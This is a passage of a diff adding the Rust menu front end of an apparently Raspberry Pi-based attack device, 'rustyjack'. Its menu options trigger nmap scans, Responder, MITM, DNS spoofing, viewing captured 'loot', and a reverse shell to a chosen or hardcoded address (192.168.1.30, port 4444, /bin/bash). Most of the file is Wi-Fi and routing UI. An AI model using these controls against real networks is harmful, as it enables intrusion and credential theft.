@@ -1,0 +1,1460 @@
+use std::{
+    fs,
+    io::Write,
+    path::{Path, PathBuf},
+    process::Command,
+    thread,
+    time::Duration,
+};
+
+use anyhow::{Result, anyhow, bail};
+use rustyjack_core::cli::{
+    AutopilotCommand, AutopilotMode as CoreAutopilotMode, AutopilotStartArgs,
+    BridgeCommand, BridgeStartArgs, BridgeStopArgs, Commands, DiscordCommand, DiscordSendArgs,
+    DnsSpoofCommand, DnsSpoofStartArgs, LootCommand, LootKind, LootListArgs, LootReadArgs,
+    MitmCommand, MitmStartArgs, NotifyCommand, ResponderArgs, ResponderCommand, ReverseCommand,
+    ReverseLaunchArgs, ScanCommand, ScanRunArgs, StatusCommand, SystemCommand, SystemUpdateArgs,
+    WifiBestArgs, WifiCommand, WifiProfileCommand, WifiProfileConnectArgs, WifiProfileDeleteArgs,
+    WifiRouteCommand, WifiRouteEnsureArgs, WifiScanArgs, WifiStatusArgs, WifiSwitchArgs,
+};
+use serde::Deserialize;
+use serde_json::{self, Value};
+use tempfile::{NamedTempFile, TempPath};
+use walkdir::WalkDir;
+use zip::{CompressionMethod, ZipWriter, write::FileOptions};
+
+use crate::{
+    config::GuiConfig,
+    core::CoreBridge,
+    display::{Display, DashboardView},
+    input::{Button, ButtonPad},
+    menu::{AutopilotMode, ColorTarget, LootSection, MenuAction, MenuEntry, MenuTree, ScanProfile, menu_title},
+    stats::StatsSampler,
+};
+
+pub struct App {
+    core: CoreBridge,
+    display: Display,
+    buttons: ButtonPad,
+    config: GuiConfig,
+    menu: MenuTree,
+    menu_state: MenuState,
+    stats: StatsSampler,
+    root: PathBuf,
+    spoof_site: String,
+    bridge_pair: Option<(String, String)>,
+    dashboard_view: Option<DashboardView>,
+}
+
+enum WifiMenuChoice {
+    ScanNetworks,
+    SavedProfiles,
+    QuickToggle,
+    InterfaceConfig,
+    StatusInfo,
+    RouteControl,
+    Exit,
+}
+
+enum WifiRouteChoice {
+    Snapshot,
+    ForceWifi,
+    ForceEthernet,
+    Backup,
+    Restore,
+    Exit,
+}
+
+#[derive(Debug, Clone, Deserialize)]
+struct WifiScanResponse {
+    interface: String,
+    #[serde(default)]
+    networks: Vec<WifiNetworkEntry>,
+}
+
+#[derive(Debug, Clone, Deserialize)]
+struct WifiNetworkEntry {
+    #[serde(default)]
+    ssid: Option<String>,
+    #[serde(default)]
+    bssid: Option<String>,
+    #[serde(default)]
+    signal_dbm: Option<i32>,
+    #[serde(default)]
+    channel: Option<u8>,
+    #[serde(default)]
+    encrypted: bool,
+}
+
+#[derive(Debug, Clone, Deserialize)]
+struct WifiProfilesResponse {
+    profiles: Vec<WifiProfileSummary>,
+}
+
+#[derive(Debug, Clone, Deserialize)]
+struct WifiProfileSummary {
+    ssid: String,
+    interface: String,
+    priority: i32,
+}
+
+#[derive(Debug, Clone, Deserialize)]
+struct WifiListResponse {
+    interfaces: Vec<InterfaceSummary>,
+}
+
+#[derive(Debug, Clone, Deserialize)]
+struct InterfaceSummary {
+    name: String,
+    kind: String,
+    #[serde(default)]
+    oper_state: String,
+    #[serde(default)]
+    ip: Option<String>,
+}
+
+#[derive(Debug, Clone, Deserialize, Default)]
+struct RouteSnapshot {
+    #[serde(default)]
+    default_route: Option<RouteInfo>,
+    #[serde(default)]
+    interfaces: Vec<InterfaceSummary>,
+    #[serde(default)]
+    dns_servers: Vec<String>,
+}
+
+#[derive(Debug, Clone, Deserialize, Default)]
+struct RouteInfo {
+    #[serde(default)]
+    interface: Option<String>,
+    #[serde(default)]
+    gateway: Option<String>,
+}
+
+#[derive(Debug, Clone, Deserialize, Default)]
+struct WifiStatusOverview {
+    interface: String,
+    #[serde(default)]
+    address: Option<String>,
+    #[serde(default)]
+    gateway: Option<String>,
+    #[serde(default)]
+    connected: Option<bool>,
+    #[serde(default)]
+    ssid: Option<String>,
+}
+
+fn format_network_label(net: &WifiNetworkEntry) -> String {
+    let ssid = net.ssid.as_deref().unwrap_or("<hidden>");
+    let signal = net
+        .signal_dbm
+        .map(|s| format!("{s} dBm"))
+        .unwrap_or_else(|| "".to_string());
+    let lock = if net.encrypted { "🔒" } else { "🔓" };
+    if signal.is_empty() {
+        format!("{lock} {ssid}")
+    } else {
+        format!("{lock} {ssid} {signal}")
+    }
+}
+
+struct MenuState {
+    stack: Vec<String>,
+    selection: usize,
+}
+
+impl MenuState {
+    fn new() -> Self {
+        Self {
+            stack: vec!["a".to_string()],
+            selection: 0,
+        }
+    }
+
+    fn current_id(&self) -> &str {
+        self.stack.last().map(|s| s.as_str()).unwrap_or("a")
+    }
+
+    fn enter(&mut self, id: &str) {
+        self.stack.push(id.to_string());
+        self.selection = 0;
+    }
+
+    fn back(&mut self) {
+        if self.stack.len() > 1 {
+            self.stack.pop();
+            self.selection = 0;
+        }
+    }
+
+    fn move_up(&mut self, total: usize) {
+        if total == 0 {
+            self.selection = 0;
+            return;
+        }
+        if self.selection == 0 {
+            self.selection = total - 1;
+        } else {
+            self.selection -= 1;
+        }
+    }
+
+    fn move_down(&mut self, total: usize) {
+        if total == 0 {
+            self.selection = 0;
+            return;
+        }
+        self.selection = (self.selection + 1) % total;
+    }
+}
+
+impl App {
+    pub fn new() -> Result<Self> {
+        let core = CoreBridge::with_root(None)?;
+        let root = core.root().to_path_buf();
+        let config = GuiConfig::load(&root)?;
+        let display = Display::new(&config.colors)?;
+        let buttons = ButtonPad::new(&config.pins)?;
+        let stats = StatsSampler::spawn(core.clone());
+
+        Ok(Self {
+            core,
+            display,
+            buttons,
+            config,
+            menu: MenuTree::new(),
+            menu_state: MenuState::new(),
+            stats,
+            root,
+            spoof_site: "wordpress".to_string(),
+            bridge_pair: None,
+            dashboard_view: None,
+        })
+    }
+
+    pub fn run(mut self) -> Result<()> {
+        loop {
+            if let Some(view) = self.dashboard_view {
+                // Dashboard mode
+                let status = self.stats.snapshot();
+                self.display.draw_dashboard(view, &status)?;
+                
+                let button = self.buttons.wait_for_press()?;
+                match button {
+                    Button::Left | Button::Key3 => {
+                        // Exit dashboard, return to menu
+                        self.dashboard_view = None;
+                    }
+                    Button::Right | Button::Select => {
+                        // Cycle to next dashboard
+                        self.dashboard_view = Some(match view {
+                            DashboardView::SystemHealth => DashboardView::AttackMetrics,
+                            DashboardView::AttackMetrics => DashboardView::LootSummary,
+                            DashboardView::LootSummary => DashboardView::NetworkTraffic,
+                            DashboardView::NetworkTraffic => DashboardView::SystemHealth,
+                        });
+                    }
+                    _ => {}
+                }
+            } else {
+                // Menu mode
+                let entries = self.render_menu()?;
+                let button = self.buttons.wait_for_press()?;
+                match button {
+                    Button::Up => self.menu_state.move_up(entries.len()),
+                    Button::Down => self.menu_state.move_down(entries.len()),
+                    Button::Left | Button::Key3 => self.menu_state.back(),
+                    Button::Right | Button::Select => {
+                        if let Some(entry) = entries.get(self.menu_state.selection) {
+                            let action = entry.action.clone();
+                            self.execute_action(action)?;
+                        }
+                    }
+                    Button::Key1 => {} // View toggles reserved for future layouts
+                    Button::Key2 => {} // Reserved
+                }
+            }
+        }
+    }
+
+    fn render_menu(&mut self) -> Result<Vec<MenuEntry>> {
+        let mut entries = self.menu.entries(self.menu_state.current_id())?;
+        if entries.is_empty() {
+            entries.push(MenuEntry {
+                label: " Nothing here".to_string(),
+                action: MenuAction::ShowInfo,
+            });
+        }
+        if self.menu_state.selection >= entries.len() {
+            self.menu_state.selection = entries.len().saturating_sub(1);
+        }
+        let status = self.stats.snapshot();
+        let labels: Vec<String> = entries.iter().map(|entry| entry.label.clone()).collect();
+        self.display.draw_menu(
+            menu_title(self.menu_state.current_id()),
+            &labels,
+            self.menu_state.selection,
+            &status,
+        )?;
+        Ok(entries)
+    }
+
+    fn execute_action(&mut self, action: MenuAction) -> Result<()> {
+        match action {
+            MenuAction::Submenu(id) => self.menu_state.enter(id),
+            MenuAction::Scan(profile) => self.run_scan(profile)?,
+            MenuAction::ReverseDefault => self.launch_default_reverse()?,
+            MenuAction::ReverseCustom => self.launch_remote_reverse("192.168.1.30")?,
+            MenuAction::ResponderOn => self.responder_on()?,
+            MenuAction::ResponderOff => self.responder_off()?,
+            MenuAction::MitmStart => self.mitm_start()?,
+            MenuAction::MitmStop => {
+                self.simple_command(Commands::Mitm(MitmCommand::Stop), "MITM stopped")?
+            }
+            MenuAction::DnsStart => self.dns_start()?,
+            MenuAction::DnsStop => self.simple_command(
+                Commands::DnsSpoof(DnsSpoofCommand::Stop),
+                "DNS spoof stopped",
+            )?,
+            MenuAction::SpoofSite(site) => self.set_spoof_site(site),
+            MenuAction::ShowInfo => self.show_network_info()?,
+            MenuAction::BrowseImages => {
+                self.show_message("Images", ["Feature moved to Rust UI", "Coming soon"])?
+            }
+            MenuAction::RefreshConfig => self.reload_config()?,
+            MenuAction::SaveConfig => self.save_config()?,
+            MenuAction::SetColor(target) => self.pick_color(target)?,
+            MenuAction::Shutdown => self.shutdown_device()?,
+            MenuAction::RestartUi => self.restart_ui()?,
+            MenuAction::Loot(section) => self.show_loot(section)?,
+            MenuAction::QuickWifiToggle => self.quick_wifi_toggle()?,
+            MenuAction::SwitchInterfaceMenu => self.switch_interface_menu()?,
+            MenuAction::ShowInterfaceInfo => self.show_interface_info()?,
+            MenuAction::ShowNetworkHealth => self.show_network_health()?,
+            MenuAction::ShowRoutingStatus => self.show_routing_status()?,
+            MenuAction::SwitchToWifi => self.switch_to_wifi()?,
+            MenuAction::SwitchToEthernet => self.switch_to_ethernet()?,
+            MenuAction::WifiManager => self.launch_wifi_manager()?,
+            MenuAction::BridgeStart => self.start_bridge()?,
+            MenuAction::BridgeStop => self.stop_bridge()?,
+            MenuAction::DiscordUpload => self.discord_upload()?,
+            MenuAction::SystemUpdate => self.run_system_update()?,
+            MenuAction::ViewDashboards => {
+                self.dashboard_view = Some(DashboardView::SystemHealth);
+            }
+            MenuAction::AutopilotStart(mode) => self.autopilot_start(mode)?,
+            MenuAction::AutopilotStop => self.autopilot_stop()?,
+            MenuAction::AutopilotStatus => self.autopilot_status()?,
+        }
+        Ok(())
+    }
+
+    fn run_scan(&mut self, profile: &ScanProfile) -> Result<()> {
+        self.show_message("Nmap", ["Launching scan...", profile.label, "Please wait"])?;
+        let args = ScanRunArgs {
+            label: profile.label.to_string(),
+            nmap_args: profile.args.iter().map(|arg| arg.to_string()).collect(),
+            interface: None,
+            target: None,
+            output_path: None,
+            no_discord: false,
+        };
+        let command = Commands::Scan(ScanCommand::Run(args));
+        let (_, data) = self.core.dispatch(command)?;
+        let interface = data
+            .get("interface")
+            .and_then(Value::as_str)
+            .unwrap_or("unknown");
+        let target = data.get("target").and_then(Value::as_str).unwrap_or("");
+        let mut lines = vec![profile.label.to_string(), format!("Interface: {interface}")];
+        if !target.is_empty() {
+            lines.push(format!("Target: {target}"));
+        }
+        self.show_message("Scan complete", lines)
+    }
+
+    fn launch_default_reverse(&mut self) -> Result<()> {
+        let best_args = WifiBestArgs { prefer_wifi: false };
+        let (_, data) = self
+            .core
+            .dispatch(Commands::Wifi(WifiCommand::Best(best_args)))?;
+        let interface = data
+            .get("interface")
+            .and_then(Value::as_str)
+            .unwrap_or("eth0")
+            .to_string();
+
+        let status_args = WifiStatusArgs {
+            interface: Some(interface.clone()),
+        };
+        let (_, status) = self
+            .core
+            .dispatch(Commands::Wifi(WifiCommand::Status(status_args)))?;
+        let address = status
+            .get("address")
+            .and_then(Value::as_str)
+            .ok_or_else(|| anyhow!("No IPv4 address on interface {interface}"))?;
+        let parts: Vec<&str> = address.split('.').collect();
+        if parts.len() < 4 {
+            bail!("Unexpected IP format: {address}");
+        }
+        let prefix = parts[..3].join(".");
+        if let Some(octet) = self.prompt_octet(&prefix)? {
+            let target = format!("{prefix}.{octet}");
+            self.launch_reverse(&target, &interface)
+        } else {
+            self.show_message("Reverse shell", ["Cancelled"])?;
+            Ok(())
+        }
+    }
+
+    fn launch_remote_reverse(&mut self, target: &str) -> Result<()> {
+        self.launch_reverse(target, "eth0")
+    }
+
+    fn launch_reverse(&mut self, target: &str, interface: &str) -> Result<()> {
+        let command = Commands::Reverse(ReverseCommand::Launch(ReverseLaunchArgs {
+            target: target.to_string(),
+            port: 4444,
+            shell: "/bin/bash".into(),
+            interface: Some(interface.to_string()),
+        }));
+        self.simple_command(command, "Reverse shell launched")
+    }
+
+    fn responder_on(&mut self) -> Result<()> {
+        let command = Commands::Responder(ResponderCommand::On(ResponderArgs { interface: None }));
+        self.simple_command(command, "Responder started")
+    }
+
+    fn responder_off(&mut self) -> Result<()> {
+        self.simple_command(
+            Commands::Responder(ResponderCommand::Off),
+            "Responder stopped",
+        )
+    }
+
+    fn mitm_start(&mut self) -> Result<()> {
+        let args = MitmStartArgs {
+            interface: None,
+            network: None,
+        };
+        self.simple_command(Commands::Mitm(MitmCommand::Start(args)), "MITM launched")
+    }
+
+    fn dns_start(&mut self) -> Result<()> {
+        let args = DnsSpoofStartArgs {
+            site: self.spoof_site.clone(),
+            interface: None,
+        };
+        self.simple_command(
+            Commands::DnsSpoof(DnsSpoofCommand::Start(args)),
+            "DNS spoof started",
+        )
+    }
+
+    fn set_spoof_site(&mut self, site: &str) {
+        self.spoof_site = site.to_string();
+    }
+
+    fn simple_command(&mut self, command: Commands, success: &str) -> Result<()> {
+        if let Err(err) = self.core.dispatch(command) {
+            self.show_message("Error", [format!("{err}")])?;
+        } else {
+            self.show_message("Success", [success.to_string()])?;
+        }
+        Ok(())
+    }
+
+    fn show_message<I, S>(&mut self, title: &str, lines: I) -> Result<()>
+    where
+        I: IntoIterator<Item = S>,
+        S: AsRef<str>,
+    {
+        let overlay = self.stats.snapshot();
+        let content: Vec<String> = std::iter::once(title.to_string())
+            .chain(lines.into_iter().map(|line| line.as_ref().to_string()))
+            .collect();
+        self.display.draw_dialog(&content, &overlay)?;
+        thread::sleep(Duration::from_millis(1200));
+        Ok(())
+    }
+
+    fn reload_config(&mut self) -> Result<()> {
+        self.config = GuiConfig::load(&self.root)?;
+        self.display.update_palette(&self.config.colors);
+        self.show_message("Config", ["Reloaded"])
+    }
+
+    fn save_config(&mut self) -> Result<()> {
+        self.config.save(&self.root.join("gui_conf.json"))?;
+        self.show_message("Config", ["Saved"])
+    }
+
+    fn pick_color(&mut self, target: ColorTarget) -> Result<()> {
+        let choices = ["#ffffff", "#05ff00", "#ff0000", "#2d0fff", "#141494"];
+        let mut index = 0;
+        loop {
+            let overlay = self.stats.snapshot();
+            let label = format!("{:?}: {}", target, choices[index]);
+            self.display.draw_dialog(&[label.clone()], &overlay)?;
+            let button = self.buttons.wait_for_press()?;
+            match button {
+                Button::Left => index = (index + choices.len() - 1) % choices.len(),
+                Button::Right | Button::Select => {
+                    self.apply_color(target.clone(), choices[index]);
+                    self.display
+                        .draw_dialog(&["Color updated".into()], &overlay)?;
+                    thread::sleep(Duration::from_millis(600));
+                    break;
+                }
+                Button::Key3 => break,
+                _ => {}
+            }
+        }
+        Ok(())
+    }
+
+    fn apply_color(&mut self, target: ColorTarget, value: &str) {
+        match target {
+            ColorTarget::Background => self.config.colors.background = value.to_string(),
+            ColorTarget::Border => self.config.colors.border = value.to_string(),
+            ColorTarget::Text => self.config.colors.text = value.to_string(),
+            ColorTarget::SelectedText => self.config.colors.selected_text = value.to_string(),
+            ColorTarget::SelectedBackground => {
+                self.config.colors.selected_background = value.to_string()
+            }
+        }
+        self.display.update_palette(&self.config.colors);
+    }
+
+    fn show_network_info(&mut self) -> Result<()> {
+        let (_, data) = self
+            .core
+            .dispatch(Commands::Status(StatusCommand::Network))?;
+        let mut lines = vec!["Interface".to_string()];
+        if let Some(iface) = data.get("interface").and_then(Value::as_str) {
+            lines.push(format!("  {iface}"));
+        }
+        if let Some(addr) = data.get("address").and_then(Value::as_str) {
+            lines.push(format!("IP: {addr}"));
+        }
+        if let Some(gateway) = data.get("gateway").and_then(Value::as_str) {
+            lines.push(format!("GW: {gateway}"));
+        }
+        self.show_message("Network", lines.iter().map(|s| s.as_str()))
+    }
+
+    fn show_loot(&mut self, section: LootSection) -> Result<()> {
+        let kind = match section {
+            LootSection::Nmap => LootKind::Nmap,
+            LootSection::Responder => LootKind::Responder,
+            LootSection::DnsSpoof => LootKind::Dnsspoof,
+        };
+        let (_, data) = self
+            .core
+            .dispatch(Commands::Loot(LootCommand::List(LootListArgs { kind })))?;
+        let files = data
+            .get("files")
+            .and_then(Value::as_array)
+            .cloned()
+            .unwrap_or_default();
+        if files.is_empty() {
+            return self.show_message("Loot", ["No files"]);
+        }
+        let mut paths = Vec::new();
+        let mut labels = Vec::new();
+        for entry in &files {
+            if let Some(path) = entry.get("path").and_then(Value::as_str) {
+                let display = Path::new(path)
+                    .file_name()
+                    .and_then(|n| n.to_str())
+                    .unwrap_or(path)
+                    .to_string();
+                paths.push(path.to_string());
+                labels.push(display);
+            }
+        }
+        let Some(index) = self.choose_from_list("Loot files", &labels)? else {
+            return Ok(());
+        };
+        let path = paths
+            .get(index)
+            .cloned()
+            .unwrap_or_else(|| paths.first().cloned().unwrap());
+        let read_args = LootReadArgs {
+            path: PathBuf::from(&path),
+            max_lines: 500,
+        };
+        let (_, data) = self
+            .core
+            .dispatch(Commands::Loot(LootCommand::Read(read_args)))?;
+        let lines = data
+            .get("content")
+            .and_then(Value::as_array)
+            .map(|arr| {
+                arr.iter()
+                    .filter_map(Value::as_str)
+                    .map(|s| s.to_string())
+                    .collect::<Vec<_>>()
+            })
+            .unwrap_or_default();
+        self.show_message("Loot file", lines.iter().map(|s| s.as_str()))
+    }
+
+    fn quick_wifi_toggle(&mut self) -> Result<()> {
+        let best = WifiBestArgs { prefer_wifi: false };
+        let (_, data) = self
+            .core
+            .dispatch(Commands::Wifi(WifiCommand::Best(best)))?;
+        let current = data
+            .get("interface")
+            .and_then(Value::as_str)
+            .unwrap_or("eth0");
+        let target = if current == "wlan0" { "wlan1" } else { "wlan0" };
+        let args = WifiSwitchArgs {
+            interface: target.to_string(),
+        };
+        self.simple_command(
+            Commands::Wifi(WifiCommand::Switch(args)),
+            "Interface switched",
+        )
+    }
+
+    fn switch_interface_menu(&mut self) -> Result<()> {
+        let (_, data) = self.core.dispatch(Commands::Wifi(WifiCommand::List))?;
+        let interfaces = data
+            .get("interfaces")
+            .and_then(Value::as_array)
+            .cloned()
+            .unwrap_or_default();
+        if interfaces.is_empty() {
+            return self.show_message("Interfaces", ["None detected"]);
+        }
+        let mut names = Vec::new();
+        let mut labels = Vec::new();
+        for entry in &interfaces {
+            if let Some(name) = entry.get("name").and_then(Value::as_str) {
+                let ip = entry.get("ip").and_then(Value::as_str).unwrap_or("-");
+                labels.push(format!("{name} ({ip})"));
+                names.push(name.to_string());
+            }
+        }
+        let Some(index) = self.choose_from_list("Interfaces", &labels)? else {
+            return Ok(());
+        };
+        let target = names
+            .get(index)
+            .cloned()
+            .unwrap_or_else(|| "eth0".to_string());
+        let args = WifiSwitchArgs { interface: target };
+        self.simple_command(
+            Commands::Wifi(WifiCommand::Switch(args)),
+            "Interface switched",
+        )
+    }
+
+    fn show_interface_info(&mut self) -> Result<()> {
+        let args = WifiStatusArgs { interface: None };
+        let (_, data) = self
+            .core
+            .dispatch(Commands::Wifi(WifiCommand::Status(args)))?;
+        let lines = vec![
+            format!(
+                "Interface: {}",
+                data.get("interface")
+                    .and_then(Value::as_str)
+                    .unwrap_or("n/a")
+            ),
+            format!(
+                "IP: {}",
+                data.get("address").and_then(Value::as_str).unwrap_or("n/a")
+            ),
+            format!(
+                "Gateway: {}",
+                data.get("gateway").and_then(Value::as_str).unwrap_or("n/a")
+            ),
+        ];
+        self.show_message("Interface", lines.iter().map(|s| s.as_str()))
+    }
+
+    fn show_network_health(&mut self) -> Result<()> {
+        let (_, data) = self
+            .core
+            .dispatch(Commands::Status(StatusCommand::Network))?;
+        let mut lines = Vec::new();
+        if let Some(addr) = data.get("address").and_then(Value::as_str) {
+            lines.push(format!("IP: {addr}"));
+        }
+        let gw_status = if data
+            .get("gateway_reachable")
+            .and_then(Value::as_bool)
+            .unwrap_or(false)
+        {
+            "Gateway OK"
+        } else {
+            "Gateway down"
+        };
+        lines.push(gw_status.to_string());
+        self.show_message("Network health", lines.iter().map(|s| s.as_str()))
+    }
+
+    fn show_routing_status(&mut self) -> Result<()> {
+        let (_, data) = self
+            .core
+            .dispatch(Commands::Wifi(WifiCommand::Route(WifiRouteCommand::Status)))?;
+        let mut lines = Vec::new();
+        if let Some(iface) = data.get("default_interface").and_then(Value::as_str) {
+            lines.push(format!("Default: {iface}"));
+        }
+        if let Some(gw) = data.get("gateway").and_then(Value::as_str) {
+            lines.push(format!("Gateway: {gw}"));
+        }
+        self.show_message("Routing", lines.iter().map(|s| s.as_str()))
+    }
+
+    fn switch_to_wifi(&mut self) -> Result<()> {
+        self.simple_command(
+            Commands::Wifi(WifiCommand::Route(WifiRouteCommand::Ensure(
+                WifiRouteEnsureArgs {
+                    interface: "wlan0".into(),
+                },
+            ))),
+            "Switched to WiFi",
+        )
+    }
+
+    fn switch_to_ethernet(&mut self) -> Result<()> {
+        self.simple_command(
+            Commands::Wifi(WifiCommand::Route(WifiRouteCommand::Ensure(
+                WifiRouteEnsureArgs {
+                    interface: "eth0".into(),
+                },
+            ))),
+            "Switched to Ethernet",
+        )
+    }
+
+    fn launch_wifi_manager(&mut self) -> Result<()> {
+        use WifiMenuChoice::*;
+        let actions = vec![
+            ("Scan networks", ScanNetworks),
+            ("Saved profiles", SavedProfiles),
+            ("Quick toggle 0↔1", QuickToggle),
+            ("Interface config", InterfaceConfig),
+            ("Status & info", StatusInfo),
+            ("Route control", RouteControl),
+            ("Exit Wi-Fi manager", Exit),
+        ];
+
+        loop {
+            let labels: Vec<String> = actions
+                .iter()
+                .map(|(label, _)| format!(" {label}"))
+                .collect();
+            let selection = self.choose_from_list("Wi-Fi Manager", &labels)?;
+            let Some(index) = selection else {
+                break;
+            };
+            match actions[index].1 {
+                ScanNetworks => self.show_wifi_scan_menu()?,
+                SavedProfiles => self.show_wifi_profiles_menu()?,
+                QuickToggle => {
+                    self.quick_wifi_toggle()?;
+                }
+                InterfaceConfig => self.show_wifi_interface_menu()?,
+                StatusInfo => self.show_wifi_status_view()?,
+                RouteControl => self.show_wifi_route_menu()?,
+                Exit => break,
+            }
+        }
+        Ok(())
+    }
+
+    fn show_wifi_scan_menu(&mut self) -> Result<()> {
+        loop {
+            let scan = self.fetch_wifi_scan()?;
+            if scan.networks.is_empty() {
+                self.show_message("Wi-Fi", ["No networks detected"])?;
+                return Ok(());
+            }
+            let mut labels: Vec<String> = scan.networks.iter().map(format_network_label).collect();
+            labels.push("Rescan networks".to_string());
+            let title = format!("Networks ({})", scan.interface);
+            let Some(index) = self.choose_from_list(&title, &labels)? else {
+                break;
+            };
+            if index == scan.networks.len() {
+                continue;
+            }
+            self.handle_network_selection(&scan.networks[index])?;
+        }
+        Ok(())
+    }
+
+    fn show_wifi_profiles_menu(&mut self) -> Result<()> {
+        loop {
+            let profiles = self.fetch_wifi_profiles()?;
+            if profiles.is_empty() {
+                self.show_message("Wi-Fi", ["No saved profiles"])?;
+                return Ok(());
+            }
+            let mut labels: Vec<String> = profiles
+                .iter()
+                .map(|profile| {
+                    format!(
+                        "{} [{}] prio {}",
+                        profile.ssid, profile.interface, profile.priority
+                    )
+                })
+                .collect();
+            labels.push("Refresh profiles".to_string());
+            let Some(index) = self.choose_from_list("Saved profiles", &labels)? else {
+                break;
+            };
+            if index == profiles.len() {
+                continue;
+            }
+            self.handle_profile_selection(&profiles[index])?;
+        }
+        Ok(())
+    }
+
+    fn show_wifi_interface_menu(&mut self) -> Result<()> {
+        loop {
+            let interfaces = self.fetch_wifi_interfaces()?;
+            if interfaces.is_empty() {
+                self.show_message("Wi-Fi", ["No interfaces detected"])?;
+                return Ok(());
+            }
+            let mut labels: Vec<String> = interfaces
+                .iter()
+                .map(|iface| {
+                    let ip = iface.ip.as_deref().unwrap_or("no ip");
+                    format!("{} ({}) {ip}", iface.name, iface.kind)
+                })
+                .collect();
+            labels.push("Refresh list".to_string());
+            let Some(index) = self.choose_from_list("Interface config", &labels)? else {
+                break;
+            };
+            if index == interfaces.len() {
+                continue;
+            }
+            let target = interfaces[index].name.clone();
+            let args = WifiSwitchArgs { interface: target };
+            self.simple_command(
+                Commands::Wifi(WifiCommand::Switch(args)),
+                "Interface preference saved",
+            )?;
+        }
+        Ok(())
+    }
+
+    fn show_wifi_status_view(&mut self) -> Result<()> {
+        let status = self.fetch_wifi_status()?;
+        let snapshot = self.fetch_route_snapshot()?;
+        let mut lines = vec![
+            format!("Active: {}", status.interface),
+            format!(
+                "IP: {}",
+                status.address.unwrap_or_else(|| "n/a".to_string())
+            ),
+        ];
+        if let Some(ssid) = status.ssid {
+            let extra = if status.connected.unwrap_or(false) {
+                format!("SSID: {ssid}")
+            } else {
+                format!("SSID: (not connected)")
+            };
+            lines.push(extra);
+        }
+        if let Some(gateway) = status.gateway {
+            lines.push(format!("GW: {gateway}"));
+        }
+        if let Some(route) = snapshot.default_route {
+            if let Some(iface) = route.interface {
+                lines.push(format!("Default: {iface}"));
+            }
+            if let Some(gw) = route.gateway {
+                lines.push(format!("Route GW: {gw}"));
+            }
+        }
+        if !snapshot.dns_servers.is_empty() {
+            lines.push("DNS:".to_string());
+            for dns in snapshot.dns_servers.iter().take(3) {
+                lines.push(format!("  {dns}"));
+            }
+        }
+        self.show_message("Wi-Fi info", lines.iter().map(|s| s.as_str()))
+    }
+
+    fn show_wifi_route_menu(&mut self) -> Result<()> {
+        use WifiRouteChoice::*;
+        let actions = vec![
+            ("Show snapshot", Snapshot),
+            ("Force Wi-Fi default", ForceWifi),
+            ("Force Ethernet default", ForceEthernet),
+            ("Backup routes", Backup),
+            ("Restore routes", Restore),
+            ("Exit route control", Exit),
+        ];
+
+        loop {
+            let labels: Vec<String> = actions
+                .iter()
+                .map(|(label, _)| format!(" {label}"))
+                .collect();
+            let Some(index) = self.choose_from_list("Route control", &labels)? else {
+                break;
+            };
+            match actions[index].1 {
+                Snapshot => {
+                    self.show_route_snapshot()?;
+                }
+                ForceWifi => {
+                    self.switch_to_wifi()?;
+                }
+                ForceEthernet => {
+                    self.switch_to_ethernet()?;
+                }
+                Backup => self.backup_routes()?,
+                Restore => self.restore_routes()?,
+                Exit => break,
+            }
+        }
+        Ok(())
+    }
+
+    fn shutdown_device(&mut self) -> Result<()> {
+        Command::new("poweroff").status().ok();
+        Ok(())
+    }
+
+    fn restart_ui(&mut self) -> Result<()> {
+        Command::new("systemctl")
+            .args(["restart", "raspyjack"])
+            .status()
+            .ok();
+        Ok(())
+    }
+
+    fn choose_from_list(&mut self, title: &str, items: &[String]) -> Result<Option<usize>> {
+        if items.is_empty() {
+            return Ok(None);
+        }
+        let mut index = 0usize;
+        loop {
+            let overlay = self.stats.snapshot();
+            let content = vec![title.to_string(), items[index].clone()];
+            self.display.draw_dialog(&content, &overlay)?;
+            match self.buttons.wait_for_press()? {
+                Button::Up => {
+                    if index == 0 {
+                        index = items.len() - 1;
+                    } else {
+                        index -= 1;
+                    }
+                }
+                Button::Down => index = (index + 1) % items.len(),
+                Button::Select | Button::Right => return Ok(Some(index)),
+                Button::Left | Button::Key3 => return Ok(None),
+                _ => {}
+            }
+        }
+    }
+
+    fn prompt_octet(&mut self, prefix: &str) -> Result<Option<u8>> {
+        let mut value: i32 = 1;
+        loop {
+            let overlay = self.stats.snapshot();
+            let content = vec![
+                "Reverse shell target".to_string(),
+                format!("{prefix}.{}", value.clamp(0, 255)),
+                "UP/DOWN to adjust".to_string(),
+                "OK to confirm".to_string(),
+            ];
+            self.display.draw_dialog(&content, &overlay)?;
+            match self.buttons.wait_for_press()? {
+                Button::Up => value = (value + 1).min(255),
+                Button::Down => value = (value - 1).max(0),
+                Button::Key1 => value = (value + 5).min(255),
+                Button::Key2 => value = (value - 5).max(0),
+                Button::Select | Button::Right => return Ok(Some(value as u8)),
+                Button::Left | Button::Key3 => return Ok(None),
+            }
+        }
+    }
+
+    fn handle_network_selection(&mut self, network: &WifiNetworkEntry) -> Result<()> {
+        let Some(ssid) = network
+            .ssid
+            .as_deref()
+            .filter(|s| !s.is_empty())
+            .map(|s| s.to_string())
+        else {
+            self.show_message("Wi-Fi", ["Hidden SSID - configure via CLI"])?;
+            return Ok(());
+        };
+        let mut details = vec![format!("SSID: {ssid}")];
+        if let Some(signal) = network.signal_dbm {
+            details.push(format!("Signal: {signal} dBm"));
+        }
+        if let Some(channel) = network.channel {
+            details.push(format!("Channel: {channel}"));
+        }
+        if let Some(bssid) = network.bssid.as_deref() {
+            details.push(format!("BSSID: {bssid}"));
+        }
+        details.push(if network.encrypted {
+            "Encrypted: yes".to_string()
+        } else {
+            "Encrypted: no".to_string()
+        });
+        self.show_message("Network", details.iter().map(|s| s.as_str()))?;
+
+        let actions = vec!["Connect".to_string(), "Back".to_string()];
+        if let Some(choice) = self.choose_from_list("Network action", &actions)? {
+            if choice == 0 {
+                if self.connect_profile_by_ssid(&ssid)? {
+                    // message handled in helper
+                } else {
+                    let msg = vec![format!("No saved profile for {ssid}")];
+                    self.show_message("Wi-Fi", msg.iter().map(|s| s.as_str()))?;
+                }
+            }
+        }
+        Ok(())
+    }
+
+    fn handle_profile_selection(&mut self, profile: &WifiProfileSummary) -> Result<()> {
+        let actions = vec![
+            "Connect".to_string(),
+            "Delete".to_string(),
+            "Back".to_string(),
+        ];
+        if let Some(choice) =
+            self.choose_from_list(&format!("Profile {}", profile.ssid), &actions)?
+        {
+            match choice {
+                0 => self.connect_named_profile(&profile.ssid)?,
+                1 => self.delete_profile(&profile.ssid)?,
+                _ => {}
+            }
+        }
+        Ok(())
+    }
+
+    fn fetch_wifi_scan(&mut self) -> Result<WifiScanResponse> {
+        let args = WifiScanArgs { interface: None };
